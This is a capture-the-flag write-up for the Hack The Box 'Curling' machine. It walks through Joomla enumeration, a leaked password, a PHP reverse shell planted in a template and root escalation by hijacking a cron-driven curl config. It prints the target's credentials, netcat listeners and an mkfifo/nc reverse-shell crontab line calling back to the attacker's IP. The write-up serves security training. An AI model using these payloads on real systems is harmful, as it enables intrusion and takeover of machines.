![Pasted image 20230721151151](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/921ad426-9eb8-4ac3-b6e8-c71ed53c4af0)

# Enumeration
Nmap:
```nmap
Nmap scan report for 10.129.174.250
Host is up (0.052s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8ad169b490203ea7b65401eb68303aca (RSA)
|   256 9f0bc2b20bad8fa14e0bf63379effb43 (ECDSA)
|_  256 c12a3544300c5b566a3fa5cc6466d9a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Home
|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA
|_http-generator: Joomla! - Open Source Content Management
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Website
The website has a login. Might be a vector for entry... 

Website is using Joomla as a content management system (CMS). 

Checking the source code for the webpage shows a comment at the bottom of the file:
```html
...SNIP...

	</footer>
	
</body>
      <!-- secret.txt -->
</html>
```
secret.txt might be something. Going to this page gives the following:
```
Q3VybGluZzIwMTgh
```
It's something... Not sure what. Maybe a password? 
Turns out this is base64 encoded. Decoding reveals the password is `Curling2018!`

Looking for more information on the main page shows all the posts created by a super user. The very first post is signed by someone named Floris which is likely the user's name. 

Dirb was able to find a second login at /administrator/ which could be good. 

Found the website's login:
```
floris:Curling2018!
```

# Foothold
Now that I'm in, I need to find a way to pop a shell... 

The templates for these cms systems are very commonly exploitable if I can edit them. There are two templates available: Breez3 and Protostar. I edited the index.php for both of them to be the same. I replaced them with the php-reverse-shell.php script in the attack box. After navigating to the main page with a listener:
```
┌─[us-dedivip-1]─[10.10.14.75]─[htb-th1stle@htb-avtshahq9c]─[~]
└──╼ [★]$ nc -lnvp 1234
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.129.174.250.
Ncat: Connection from 10.129.174.250:60630.
Linux curling 4.15.0-156-generic #163-Ubuntu SMP Thu Aug 19 23:31:58 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 19:55:18 up 38 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
Woo Hoo! Now I need a user!
Upgrade the shell with standard [interactive shell upgrade](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys)

I can open the folder for Floris, but I can't read user.txt with my current permissions. The directory contains the following:
```
www-data@curling:/home/floris$ ls -la
total 44
drwxr-xr-x 6 floris floris 4096 Aug  2  2022 .
drwxr-xr-x 3 root   root   4096 Aug  2  2022 ..
lrwxrwxrwx 1 root   root      9 May 22  2018 .bash_history -> /dev/null
-rw-r--r-- 1 floris floris  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 floris floris 3771 Apr  4  2018 .bashrc
drwx------ 2 floris floris 4096 Aug  2  2022 .cache
drwx------ 3 floris floris 4096 Aug  2  2022 .gnupg
drwxrwxr-x 3 floris floris 4096 Aug  2  2022 .local
-rw-r--r-- 1 floris floris  807 Apr  4  2018 .profile
drwxr-x--- 2 root   floris 4096 Aug  2  2022 admin-area
-rw-r--r-- 1 floris floris 1076 May 22  2018 password_backup
-rw-r----- 1 floris floris   33 Jul 21 19:18 user.txt
```
password_backup looks juicy... 

```
www-data@curling:/home/floris$ cat password_backup 
00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&SY...H..
00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4
00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`
00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......
00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..
00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........4
00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..
00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..<~.x
00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .>...sVT.zH....1
00000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s."
000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.
000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..
000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C
000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..
000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.
000000f0: 819b bb48                                ...H
www-data@curling:/home/floris$
```
Well that's fun. Looks to be encoded... 
Could be a good use of [cyberchef!](https://gchq.github.io/CyberChef/)

After a lot of playing around with the data, I got a file... 
I just used the magic wand button in the output... until it spat out password.txt as a file. It contains this:

```
5d<wdCbdZu)|hChXll
```

And this turns out to be the user's password:
```
floris : 5d<wdCbdZu)|hChXll
```

# Escalation
I downloaded [pspy64](https://github.com/DominicBreuker/pspy) and ran it on the machine. Eventually it kept trying to run the following:
```
2023/07/21 20:16:37 CMD: UID=0     PID=1      | /sbin/init maybe-ubiquity 
2023/07/21 20:17:01 CMD: UID=0     PID=28283  | curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report 
2023/07/21 20:17:01 CMD: UID=0     PID=28282  | /bin/sh -c    cd / && run-parts --report /etc/cron.hourly 
2023/07/21 20:17:01 CMD: UID=0     PID=28281  | sleep 1 
2023/07/21 20:17:01 CMD: UID=0     PID=28280  | /bin/sh -c sleep 1; cat /root/default.txt > /home/floris/admin-area/input 
2023/07/21 20:17:01 CMD: UID=0     PID=28278  | /bin/sh -c    cd / && run-parts --report /etc/cron.hourly 
2023/07/21 20:17:01 CMD: UID=0     PID=28277  | /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report 
2023/07/21 20:17:01 CMD: UID=0     PID=28276  | /usr/sbin/CRON -f 
2023/07/21 20:17:01 CMD: UID=0     PID=28275  | /usr/sbin/CRON -f 
2023/07/21 20:17:01 CMD: UID=0     PID=28274  | /usr/sbin/CRON -f 
2023/07/21 20:17:01 CMD: UID=33    PID=28287  | sh -c uname -a; w; id; /bin/sh -i 
2023/07/21 20:17:01 CMD: UID=33    PID=28285  | sh -c uname -a; w; id; /bin/sh -i 
2023/07/21 20:17:01 CMD: UID=33    PID=28288  | sh -c uname -a; w; id; /bin/sh -i 
2023/07/21 20:17:02 CMD: UID=0     PID=28290  | cat /root/default.txt 
```
So now what?

Well, clearly I need to alter the text in the input file. Currently it just says 
```
url = "http://127.0.0.1"
```
It's basically telling curl to take the input url of the local machine, run it, then write it to an output file. Then that output file is run against cron jobs. So I'll need to point it to something that will write a malicious cronjob. Tricky...
Also, it reverts the input file every time it runs... annoying...

First, I'll need to make a malicious crontab file. I can do this by copying /etc/crontab from my machine into the directory I'm working with. Then I can add the malicious entry as the following:
```bash
echo '*  *  *  *  * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.75 1337 >/tmp/f ' >> crontab
```
This should create a cronjob that points a shell back to my listener.
Started the listener on port 1337

I edited the file to be the following:
```
url = "http://10.10.14.75:1234/crontab"
output = "/etc/crontab"
```
Now I wait..... 

```
$ nc -lnvp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.129.174.250.
Ncat: Connection from 10.129.174.250:37760.
/bin/sh: 0: can't access tty; job control turned off
# whoami && id
root
uid=0(root) gid=0(root) groups=0(root)

```
Curling has been PWNED!
